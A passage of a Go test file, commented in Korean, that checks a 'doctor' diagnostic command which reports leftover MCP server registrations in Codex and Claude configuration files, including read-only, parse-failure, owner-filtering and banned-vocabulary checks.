			wantPath := filepath.Join(home, "config.toml")
			// 재기준선(릴리스 리뷰 F1): 보고 줄이 서버 이름을 함께 든다 — 거름이 생겨 그 이름이
			// retiredServerNames의 리터럴이고, 그래서 다음 걸음도 <이름> 자리표시자가 아니라
			// 그 값을 그대로 든다.
			if !strings.Contains(out, "플러그인 이전 방식의 등록물이 남아 있다 — "+wantPath+":1 (ctr)\n") {
				t.Errorf("파일:줄 형식이 없다 — want 접미 %q:\n%s", wantPath+":1 (ctr)", out)
			}
			if !strings.Contains(out, "다음 걸음") || !strings.Contains(out, "codex mcp remove") || !strings.Contains(out, "codex mcp list") {
				t.Errorf("다음 걸음 안내(codex mcp remove/list)가 없다:\n%s", out)
			}
			// 재검토 리뷰 6: 위 검사는 두 갈래 메시지 모두에 "codex mcp remove"·"codex mcp
			// list" 부분 문자열이 들어 있어(하나는 실행을 권하고 하나는 닿지 못한다고 말한다)
			// 갈래를 가르지 못한다 — 갈래별 실제 문구로 가른다.
			if c.wantParses {
				if !strings.Contains(out, "다음 걸음 — codex mcp remove ctr 뒤 codex mcp list로 부재를 확인하세요") {
					t.Errorf("TOML이 파스되는데 codex mcp list/remove 실행 안내가 아니다:\n%s", out)
				}
			} else {
				if !strings.Contains(out, "다음 걸음 — 이 파일은 TOML로 파스되지 않아") {
					t.Errorf("TOML이 파스되지 않는데 '직접 열어 정리' 안내가 아니다:\n%s", out)
				}
			}
		})
	}
}

// TestDoctorCodexConfigUnreadable — 리뷰 I3. config.toml이 존재하지만 읽을 수 없으면(예:
// 그 경로가 디렉터리) doctor는 조용히 "등록물 없음"으로 읽으면 안 된다 — [19]가 이미 세운
// "판정 못 한 것을 판정했다고 말하지 않는다"는 원칙을 [16]에도 그대로 적용한다. 디렉터리를
// 파일 자리에 둬 os.ReadFile이 부재가 아닌 오류(디렉터리)를 내게 만든다
// (TestDoctorIndeterminateOnUnreadableScope와 같은 기법).
func TestDoctorCodexConfigUnreadable(t *testing.T) {
	home := isolateCodexHome(t)
	if err := os.MkdirAll(filepath.Join(home, "config.toml"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	out, _ := doctorOut(t, t.TempDir())
	if !strings.Contains(out, "[16] codex: config.toml 읽기 실패") {
		t.Errorf("읽기 실패가 조용히 삼켜졌다(등록물 없음으로 오판):\n%s", out)
	}
	if strings.Contains(out, "플러그인 이전 방식의 등록물이 남아 있다") {
		t.Errorf("읽지 못한 파일에서 손편집 등록물을 찾았다고 보고했다:\n%s", out)
	}
}

// TestDoctorCodexBackupLeftover — 옛 설치기의 config.toml.bak(D84 단일 슬롯)은 그것을 지우던
// 경로가 없어 영구 잔존한다. doctor가 다른 잔존 부류를 전부 짚으므로 이것만 빠지면 마이그레이션을
// 마친 사용자에게 아무도 언급하지 않는 파일이 남는다. **등록물 유무와 무관하게** 보고하는 것이
// 계약이다 — 관리 블록을 이미 손으로 지운 사용자에게도 .bak은 남아 있다.
func TestDoctorCodexBackupLeftover(t *testing.T) {
	home := isolateCodexHome(t)
	writeCodexConfig(t, home, "model = \"gpt-5\"\n") // 등록물 없음 — .bak만 남은 상태
	bak := filepath.Join(home, "config.toml.bak")
	if out, _ := doctorOut(t, t.TempDir()); strings.Contains(out, "config.toml 백업") {
		t.Fatalf(".bak이 없는데 보고했다:\n%s", out)
	}
	write(t, bak, []byte("model = \"gpt-4\"\n"))
	out, _ := doctorOut(t, t.TempDir())
	if !strings.Contains(out, "옛 설치기가 남긴 config.toml 백업이 있다 — "+bak) {
		t.Errorf(".bak 잔존을 보고하지 않았다:\n%s", out)
	}
	if b, err := os.ReadFile(bak); err != nil || string(b) != "model = \"gpt-4\"\n" {
		t.Errorf("doctor가 .bak을 건드렸다: %q err=%v", b, err)
	}
}

// TestDoctorWritesNothing — D96·D97: doctor는 읽기 전용이다. config.toml·.mcp.json·
// .claude/settings.json·~/.claude.json 네 파일의 mtime과 바이트가 진단 전후 동일해야 한다.
// --fix가 지워졌으니 이 계약을 깨는 유일한 경로는 회귀다(예: 실수로 남은 atomicWriteFile 호출).
// ~/.claude.json은 [20]의 사용자 스코프 절이 읽는 자리다(최종 리뷰 S11) — 호스트의 주 상태
// 저장소라 이 계약이 깨졌을 때 값이 가장 크고, 목록에 없으면 그 경로의 읽기 전용 성질이
// 코드 검토에만 기대게 된다.
func TestDoctorWritesNothing(t *testing.T) {
	home := isolateCodexHome(t)
	writeCodexConfig(t, home, "[mcp_servers.ctr]\ncommand = \"context-router\"\n\n[mcp_servers.ctr.env]\nCTR_MANAGED = \"context-router/0.1.0\"\n")
	cfgPath := filepath.Join(home, "config.toml")

	userHome := t.TempDir()
	t.Setenv("HOME", userHome)
	t.Setenv("USERPROFILE", userHome) // Windows os.UserHomeDir 이음새
	userMCPPath := filepath.Join(userHome, ".claude.json")
	write(t, userMCPPath, []byte(`{"mcpServers":{"ctr-exec":{"command":"context-router","__ctrManaged":"context-router/0.1.0"}}}`))

	projectRoot := t.TempDir()
	mcpPath := mcpConfigPath(projectRoot)
	write(t, mcpPath, []byte(`{"mcpServers":{"ctr-exec":{"command":"context-router","__ctrManaged":"context-router/0.1.0"}}}`))
	if err := os.MkdirAll(filepath.Join(projectRoot, ".claude"), 0o755); err != nil {
		t.Fatalf("mkdir .claude: %v", err)
	}
	settingsPath := filepath.Join(projectRoot, ".claude", "settings.json")
	write(t, settingsPath, []byte(`{"enabledMcpjsonServers":["ctr-exec"]}`))

	type fileSnap struct {
		mtime time.Time
		data  []byte
	}
	snapshot := func(p string) fileSnap {
		t.Helper()
		fi, err := os.Stat(p)
		if err != nil {
			t.Fatalf("stat %s: %v", filepath.Base(p), err)
		}
		data, err := os.ReadFile(p)
		if err != nil {
			t.Fatalf("read %s: %v", filepath.Base(p), err)
		}
		return fileSnap{fi.ModTime(), data}
	}

	targets := []string{cfgPath, mcpPath, settingsPath, userMCPPath}
	before := make(map[string]fileSnap, len(targets))
	for _, p := range targets {
		before[p] = snapshot(p)
	}

	if _, err := doctorOut(t, projectRoot); err != nil {
		t.Logf("doctorOut err(진단 실패 항목 존재 — 쓰기 여부와 무관, 무시): %v", err)
	}

	for _, p := range targets {
		after := snapshot(p)
		if !after.mtime.Equal(before[p].mtime) {
			t.Errorf("%s의 mtime이 doctor 실행으로 바뀌었다: before=%v after=%v", filepath.Base(p), before[p].mtime, after.mtime)
		}
		if !bytes.Equal(after.data, before[p].data) {
			t.Errorf("%s의 바이트가 doctor 실행으로 바뀌었다", filepath.Base(p))
		}
	}
}

// bannedHortatoryVocab — D100 계약 2 금지 어휘: MANDATORY·BLOCKED·Do NOT·Never·PREFER X OVER Y·
// 체크/크로스 불릿·이모지. hostSnippet과 doctor 자신의 출력 문면 양쪽이 이 목록을 공유한다
// (리뷰 M4 — 어휘 규칙은 둘에 똑같이 걸린다).
var bannedHortatoryVocab = []string{
	"MANDATORY", "BLOCKED", "Do NOT", "DO NOT", "Never", "NEVER", "PREFER ",
	"✅", "❌", "☑", "✓", "✗", "👍", "👎", "⚠️", "🚫",
}

// TestHostSnippetNoHortatoryVocabulary — D100 계약 2 어휘 규칙, hostSnippet 쪽.
func TestHostSnippetNoHortatoryVocabulary(t *testing.T) {
	for _, b := range bannedHortatoryVocab {
		if strings.Contains(hostSnippet, b) {
			t.Errorf("hostSnippet에 금지 어휘 %q가 있다", b)
		}
	}
}

// TestDoctorOutputNoHortatoryVocabulary — D100 계약 2 어휘 규칙, doctor 자신의 출력 쪽(리뷰
// M4). hostSnippet만 재면 doctor가 조립하는 진단 문면(경고·다음 걸음 안내 등)은 규칙 밖에
// 남는다 — 소스 그레핑 대신 실제 실행 출력을 재는 이유는 fmt 포맷 문자열이 아니라 사용자가
// 보는 최종 텍스트가 계약의 대상이기 때문이다. 갈래를 여럿 동시에 트리거해([16]의 손편집
// 감지·[20]의 두 절 모두) 가능한 한 많은 줄을 노출시킨다.
func TestDoctorOutputNoHortatoryVocabulary(t *testing.T) {
	home := isolateCodexHome(t)
	writeCodexConfig(t, home, "[mcp_servers.ctr]\ncommand = \"context-router\"\n")
	proj := t.TempDir()
	if err := os.MkdirAll(filepath.Join(proj, ".claude"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	write(t, filepath.Join(proj, ".claude", "settings.json"), []byte(`{"enabledMcpjsonServers":["`+ctrMCPServerName+`"]}`))
	write(t, mcpConfigPath(proj), []byte(`{"mcpServers":{"ctr-exec":{"command":"context-router","__ctrManaged":"context-router/0.1.0"}}}`))
	out, _ := doctorOut(t, proj)
	for _, b := range bannedHortatoryVocab {
		if strings.Contains(out, b) {
			t.Errorf("doctor 출력에 금지 어휘 %q가 있다:\n%s", b, out)
		}
	}
}

// TestDoctorCodexHooksScopePositive — 리뷰 I4a. [16] codex hooks: 줄의 유일한 긍정 커버리지는
// 삭제된 TestDoctorCodexMCPLine 케이스 4였다 — 남은 참조(hook_install_test.go의
// TestDoctorVersionlessHookMarker)는 "≠ 없음"을 재는 부정 필터라 그 줄이 통째로 사라져도
// 공허하게 통과한다. 실제 Codex 훅 등록물을 놓고 "미등록"이 아닌 값이 찍히는지 직접 잰다.
func TestDoctorCodexHooksScopePositive(t *testing.T) {
	codexHome := t.TempDir()
	t.Setenv("CODEX_HOME", codexHome)
	projectRoot := t.TempDir()
	hp, err := codexHooksPath(false, projectRoot)
	if err != nil {
		t.Fatalf("codexHooksPath: %v", err)
	}
	if err := atomicWriteFile(hp, seedCodexHooks(hookBinaryName, true)); err != nil {
		t.Fatalf("seed: %v", err)
	}
	out, _ := doctorOut(t, projectRoot)
	if !strings.Contains(out, "[16] codex hooks: project=등록됨(") {
		t.Errorf("훅을 설치했는데 project 스코프가 등록됨으로 나오지 않는다:\n%s", out)
	}
	if strings.Contains(out, "[16] codex hooks: project=옛 그룹 없음") {
		t.Errorf("등록된 훅이 없는 것으로 보고됐다:\n%s", out)
	}
	// 이 픽스처의 마커는 무버전(hookBinaryName)이라 marker=="" 갈래를 탄다. 그 갈래의 다음
	// 걸음이 [9] 쪽에만 단정돼 있으면 여기 문면은 통째로 지워도 초록이다 — [16]의 짝을 함께
	// 잰다(최종 재검토). 호스트 구분(--codex)까지 본다: 플래그가 빠지면 사용자가 Claude 쪽
	// 그룹을 지우려 든다.
	if !strings.Contains(out, "[16] codex hooks: project=등록됨(3개 — hook uninstall --codex로 옛 그룹을 지우고 플러그인 설치로 옮기세요 — 두 벌이 함께 있으면 같은 포착이 두 번 일어납니다)") {
		t.Errorf("[16]의 무버전 갈래가 마이그레이션 걸음을 내지 않는다:\n%s", out)
	}
}

// TestDoctorMcpJsonHandEditDetection — 리뷰 I4b. [20]의 .mcp.json 절이 [16]과 같은 모양(파일 +
// 다음 걸음)으로 보고하는지 표로 잰다. 옛 [20]은 라벨(존재·미등록·표식없음)만 보여줬는데 그
// 라벨에는 경로도 다음 걸음도 없었다 — A⑧의 위험(호스트가 command·args 일치 서버를 경고 없이
// 버린다)이 .mcp.json 쪽에도 그대로 있으므로 [16]과 같은 조치 가능한 보고가 필요하다.
func TestDoctorMcpJsonHandEditDetection(t *testing.T) {
	isolateCodexHome(t)
	cases := []struct {
		name       string
		body       string // "" = .mcp.json을 만들지 않는다
		wantReport bool
	}{
		{"소유 등록물 있음(마커)", `{"mcpServers":{"ctr-exec":{"command":"context-router","__ctrManaged":"context-router/0.1.0"}}}`, true},
		{"소유 등록물 있음(command만, 표식 없음)", `{"mcpServers":{"ctr-exec":{"command":"context-router"}}}`, true},
		{"우리 이름이 없음", `{"mcpServers":{"other":{"command":"other-tool"}}}`, false},
		{"우리 이름은 있으나 소유 아님", `{"mcpServers":{"ctr-exec":{"command":"other-tool"}}}`, false},
		{"파일 자체가 없음", "", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			projectRoot := t.TempDir()
			if c.body != "" {
				write(t, mcpConfigPath(projectRoot), []byte(c.body))
			}
			out, err := doctorOut(t, projectRoot)
			got := strings.Contains(out, "[20] claude: 플러그인 이전 방식의 등록물이 남아 있다")
			if got != c.wantReport {
				t.Errorf("report=%v want %v:\n%s", got, c.wantReport, out)
			}
			if err != nil {
				t.Errorf("이 보고는 실패 항목에 계상되면 안 된다(리뷰 M6) — err=%v", err)
			}
			if !c.wantReport {
				return
			}
			wantPath := mcpConfigPath(projectRoot)
			if !strings.Contains(out, "[20] claude: 플러그인 이전 방식의 등록물이 남아 있다 — "+wantPath+" ("+ctrMCPServerName+")\n") {
				t.Errorf("파일 경로가 없다 — want %q:\n%s", wantPath, out)
			}
			if !strings.Contains(out, "[20] claude: 다음 걸음 — claude mcp remove "+ctrMCPServerName) {
				t.Errorf("다음 걸음(claude mcp remove)이 없다:\n%s", out)
			}
		})
	}
}

// TestDoctorMcpJsonUnreadable — .mcp.json 쪽도 [16]과 같은 원칙을 진다(리뷰 I4b "같은 모양"의
// 연장): 존재하지만 못 읽으면 조용히 "없음"으로 읽으면 안 된다.
func TestDoctorMcpJsonUnreadable(t *testing.T) {
	isolateCodexHome(t)
	projectRoot := t.TempDir()
	if err := os.MkdirAll(mcpConfigPath(projectRoot), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	out, _ := doctorOut(t, projectRoot)
	if !strings.Contains(out, "[20] claude: "+mcpConfigPath(projectRoot)+" 읽기 실패") {
		t.Errorf("읽기 실패가 조용히 삼켜졌다:\n%s", out)
	}
}

// TestDoctorMcpJsonUnparseable — 최종 리뷰 S5. 쉼표 하나가 남은 `.mcp.json`은 파싱만 실패하고
// 등록물은 그대로 살아 있다. [16]이 무효 TOML에서 침묵하지 않는 것과 같은 원칙으로, 이 파일도
// 조용히 "깨끗함"으로 읽히면 안 된다 — 옛 [20]은 그 입력에서 아무 줄도 내지 않았다.
func TestDoctorMcpJsonUnparseable(t *testing.T) {
	isolateCodexHome(t)
	projectRoot := t.TempDir()
	// 우리 등록물 + 꼬리 쉼표 하나. 파싱만 실패하고 등록물은 파일 안에 살아 있다.
	write(t, mcpConfigPath(projectRoot), []byte(`{"mcpServers":{"ctr-exec":{"command":"context-router",}}}`))
	out, err := doctorOut(t, projectRoot)
	if err != nil {
		t.Errorf("이 보고는 실패 항목에 계상되면 안 된다 — err=%v", err)
	}
	if !strings.Contains(out, "[20] claude: "+mcpConfigPath(projectRoot)+" 파싱 실패") {
		t.Errorf("파싱 실패가 조용히 깨끗함으로 읽혔다:\n%s", out)
	}
}

// TestDoctorMcpJsonUserScopeLeftover — 최종 리뷰 S11. `claude mcp add --scope user`가 쓰는
// 자리는 `~/.claude.json` 최상위 `mcpServers`이고(설계 v0.12의 스코프 표), v0.18의 hostSnippet이
// 그 스코프를 권했다. 프로젝트 `.mcp.json`만 보면 그 코호트에게 doctor가 정리할 것 없음을
// 보고한다. 홈은 TestMain이 이미 임시 디렉터리로 격리한다.
func TestDoctorMcpJsonUserScopeLeftover(t *testing.T) {
	isolateCodexHome(t)
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home) // Windows os.UserHomeDir 이음새
	userConfig := filepath.Join(home, ".claude.json")
	write(t, userConfig, []byte(`{"mcpServers":{"ctr-exec":{"command":"context-router"}}}`))

	out, err := doctorOut(t, t.TempDir())
	if err != nil {
		t.Errorf("이 보고는 실패 항목에 계상되면 안 된다 — err=%v", err)
	}
	if !strings.Contains(out, "[20] claude: 플러그인 이전 방식의 등록물이 남아 있다 — "+userConfig+" ("+ctrMCPServerName+")\n") {
		t.Errorf("사용자 스코프 잔존 등록물을 놓쳤다:\n%s", out)
	}
}

// TestDoctorEnabledMcpjsonServersLeftover — task-4 브리프의 추가 요구(D97 인접, 소유자 판정) +
// 리뷰 I5 재기준선. 세 스코프(local·project·user)와 두 이름(현재 ctr-exec·옛 ctr)을 함께 잰다 —
// enabledMcpjsonServers는 스코프 간 병합되지 않고 각 스코프의 정의가 그 스코프 안에서
// 유효하므로, 한 스코프만 보면 다른 스코프의 잔존을 놓친다(옛 구현이 project 하나·현재 이름
// 하나만 봤다). user 스코프를 확인하려면 HOME·USERPROFILE을 이 테스트 전용 임시 홈으로
// 돌려야 한다(TestMain의 전역 격리 위에 이 서브테스트만의 값을 덮어써 알려진 파일을 그
// 자리에 둔다).
func TestDoctorEnabledMcpjsonServersLeftover(t *testing.T) {
	isolateCodexHome(t)
	cases := []struct {
		name     string
		scope    string // "local"|"project"|"user"|"" (파일 자체를 안 씀)
		body     string
		wantName string // "" = 보고 없음
	}{
		{"project 스코프 — 현재 이름", "project", `{"enabledMcpjsonServers":["` + ctrMCPServerName + `","other"]}`, ctrMCPServerName},
		{"local 스코프 — 현재 이름", "local", `{"enabledMcpjsonServers":["` + ctrMCPServerName + `"]}`, ctrMCPServerName},
		{"user 스코프 — 현재 이름", "user", `{"enabledMcpjsonServers":["` + ctrMCPServerName + `"]}`, ctrMCPServerName},
		{"project 스코프 — 옛 이름(ctr)", "project", `{"enabledMcpjsonServers":["ctr"]}`, "ctr"},
		{"옛 이름 없음 — 다른 이름만", "project", `{"enabledMcpjsonServers":["other"]}`, ""},
		{"키 자체 없음", "project", `{}`, ""},
		{"파일 없음", "", "", ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			home := t.TempDir()
			t.Setenv("HOME", home)        // unix
			t.Setenv("USERPROFILE", home) // windows
			projectRoot := t.TempDir()
			if c.scope != "" {
				var target string
				switch c.scope {
				case "project":
					target = filepath.Join(projectRoot, ".claude", "settings.json")
				case "local":
					target = filepath.Join(projectRoot, ".claude", "settings.local.json")
				case "user":
					target = filepath.Join(home, ".claude", "settings.json")
				}
				if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
					t.Fatalf("mkdir: %v", err)
				}
				write(t, target, []byte(c.body))
			}
			out, _ := doctorOut(t, projectRoot)
			if c.wantName == "" {
				if strings.Contains(out, "enabledMcpjsonServers에 옛 서버 이름") {
					t.Errorf("보고가 없어야 하는데 나왔다:\n%s", out)
				}
				return
			}
			want := fmt.Sprintf("enabledMcpjsonServers에 옛 서버 이름 %q가 남아 있다", c.wantName)
			if !strings.Contains(out, want) {
				t.Errorf("%q 없음:\n%s", want, out)
			}
		})
	}
}

// TestDoctorCodexOwnedServerFilter — 릴리스 리뷰 F1. codexServerHeaders는 이름을 가리지 않는
// 스캐너다(무효 TOML에서도 도는 것이 존재 이유). 보고는 그 히트 중 **첫 점 앞 세그먼트가 우리가
// 등록한 적 있는 이름**인 것만 낸다 — 거르지 않으면 `[mcp_servers.github]` 하나를 둔 사용자가
// "우리 잔존물이 남아 있다 + codex mcp remove"를 읽고 남의 서버를 지운다. 거름이 생겼으므로
// 이름도 함께 인쇄한다(보고되는 이름은 점도 인용부호도 없는 알려진 리터럴 둘 중 하나다).
// `[mcp_servers.ctr]`와 `[mcp_servers.ctr.env]`는 한 서버 한 번으로 접어 보고한다 — 제거도
// 한 번이다.
func TestDoctorCodexOwnedServerFilter(t *testing.T) {
	cases := []struct {
		name      string
		cfg       string
		wantSuf   string // "" = 등록물 보고 없음
		wantSteps string // "" = 다음 걸음 없음
	}{
		{"남의 서버만", "[mcp_servers.github]\ncommand = \"gh-mcp\"\n", "", ""},
		{
			"남의 서버와 우리 이름이 함께",
			"[mcp_servers.github]\ncommand = \"gh-mcp\"\n\n[mcp_servers.ctr]\ncommand = \"context-router\"\n",
			":4 (ctr)\n",
			"[16] codex: 다음 걸음 — codex mcp remove ctr 뒤 codex mcp list로 부재를 확인하세요",
		},
		{
			"서브테이블은 같은 서버 한 번으로",
			"[mcp_servers.ctr]\ncommand = \"context-router\"\n\n[mcp_servers.ctr.env]\nCTR_ENABLE = \"ingest\"\n",
			":1,4 (ctr)\n",
			"[16] codex: 다음 걸음 — codex mcp remove ctr 뒤 codex mcp list로 부재를 확인하세요",
		},
		{
			"현재 이름(ctr-exec)",
			"[mcp_servers.ctr-exec]\ncommand = \"context-router\"\n",
			":1 (ctr-exec)\n",
			"[16] codex: 다음 걸음 — codex mcp remove ctr-exec 뒤 codex mcp list로 부재를 확인하세요",
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			home := isolateCodexHome(t)
			writeCodexConfig(t, home, c.cfg)
			cfgPath := filepath.Join(home, "config.toml")
			out, err := doctorOut(t, t.TempDir())
			if err != nil {
				t.Errorf("이 보고는 실패 항목에 계상되면 안 된다 — err=%v", err)
			}
			const lead = "[16] codex: 플러그인 이전 방식의 등록물이 남아 있다 — "
			if c.wantSuf == "" {
				if strings.Contains(out, lead) {
					t.Fatalf("남의 서버를 우리 잔존물로 보고했다:\n%s", out)
				}
				if strings.Contains(out, "[16] codex: 다음 걸음") {
					t.Fatalf("보고가 없는데 다음 걸음을 냈다:\n%s", out)
				}
				return
			}
			if want := lead + cfgPath + c.wantSuf; !strings.Contains(out, want) {
				t.Fatalf("want %q:\n%s", want, out)
			}
			if n := strings.Count(out, lead); n != 1 {
				t.Fatalf("등록물 보고 줄 수=%d want 1(서버 하나 = 제거 하나):\n%s", n, out)
			}
			if !strings.Contains(out, c.wantSteps) {
				t.Fatalf("다음 걸음이 이름을 들지 않는다 — want %q:\n%s", c.wantSteps, out)
			}
			if strings.Contains(out, "github") {
				t.Fatalf("남의 서버 이름이 출력에 실렸다:\n%s", out)
			}
		})
	}
}

// TestDoctorCodexInvalidTOMLUnconditional — 릴리스 리뷰 F2. 파스 판정은 우리 등록물을 찾았는지에
// 매이지 않는다. Codex는 문법 오류 하나로 그 파일 전체를 무시하므로(모델 설정·훅 신뢰 항목·프로필)
// mcp_servers 테이블이 하나도 없는 무효 config.toml에서도 이 줄이 그 사용자에게 유일한 신호다.
// 유효한 파일에서는 이 줄이 없다는 것도 함께 잰다 — 무조건 인쇄하면 그것대로 오보다.
func TestDoctorCodexInvalidTOMLUnconditional(t *testing.T) {
	const wantLead = "[16] codex: config.toml이 TOML로 파스되지 않습니다 — "
	t.Run("등록물 없는 무효 파일", func(t *testing.T) {
		home := isolateCodexHome(t)
		writeCodexConfig(t, home, "[hooks]\ntrusted = [1, 2,\n")
		out, err := doctorOut(t, t.TempDir())
		if err != nil {
			t.Errorf("이 보고는 실패 항목에 계상되면 안 된다 — err=%v", err)
		}
		if want := wantLead + filepath.Join(home, "config.toml"); !strings.Contains(out, want) {
			t.Fatalf("무효 config.toml이 깨끗함으로 읽혔다 — want %q:\n%s", want, out)
		}
		if strings.Contains(out, "플러그인 이전 방식의 등록물이 남아 있다") {
			t.Fatalf("등록물이 없는데 잔존을 보고했다:\n%s", out)
		}
	})
	t.Run("유효 파일", func(t *testing.T) {
		home := isolateCodexHome(t)
		writeCodexConfig(t, home, "[model]\nname = \"gpt\"\n")
		out, _ := doctorOut(t, t.TempDir())
		if strings.Contains(out, wantLead) {
			t.Fatalf("파스되는 파일에 파스 실패를 인쇄했다:\n%s", out)
		}
	})
}

// TestDoctorEnabledScopeUnjudgeable — 릴리스 리뷰 F5. enabledMcpjsonServers 절은 읽기·파싱
// 실패를 조용히 건너뛰어 그 스코프를 "깨끗함"으로 읽었다. 이 키를 지우는 호스트 CLI가 없으므로
// (claude mcp remove는 등록물만 건드린다) 여기서 놓친 잔존은 아무도 짚지 않는다 — [20]의 앞
// 절·[19]·[16]이 이미 세운 "판정 못 한 것을 판정했다고 말하지 않는다"를 이 절에도 적용한다.
// 대상은 settings.local.json이다 — 이 절만의 실패를 만들면서 [9]의 훅 스코프 판정과 섞이지 않는다.
func TestDoctorEnabledScopeUnjudgeable(t *testing.T) {
	t.Run("읽기 실패", func(t *testing.T) {
		isolateCodexHome(t)
		projectRoot := t.TempDir()
		p := filepath.Join(projectRoot, ".claude", "settings.local.json")
		if err := os.MkdirAll(p, 0o755); err != nil { // 파일 자리에 디렉터리 — os.ReadFile이 부재 아닌 오류를 낸다
			t.Fatalf("mkdir: %v", err)
		}
		out, _ := doctorOut(t, projectRoot)
		if want := "[20] claude: " + p + " 읽기 실패"; !strings.Contains(out, want) {
			t.Fatalf("읽지 못한 스코프가 조용히 깨끗함으로 읽혔다 — want %q:\n%s", want, out)
		}
	})
	t.Run("파싱 실패", func(t *testing.T) {
		isolateCodexHome(t)
		projectRoot := t.TempDir()
		p := filepath.Join(projectRoot, ".claude", "settings.local.json")
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatalf("mkdir: %v", err)
		}
		// 승인 목록에 옛 이름이 살아 있는 채로 쉼표 하나가 남은 파일 — 파싱만 실패한다.
		write(t, p, []byte(`{"enabledMcpjsonServers":["`+ctrMCPServerName+`",}`))
		out, _ := doctorOut(t, projectRoot)
		if want := "[20] claude: " + p + " 파싱 실패"; !strings.Contains(out, want) {
			t.Fatalf("파싱 실패가 조용히 깨끗함으로 읽혔다 — want %q:\n%s", want, out)
		}
	})
}
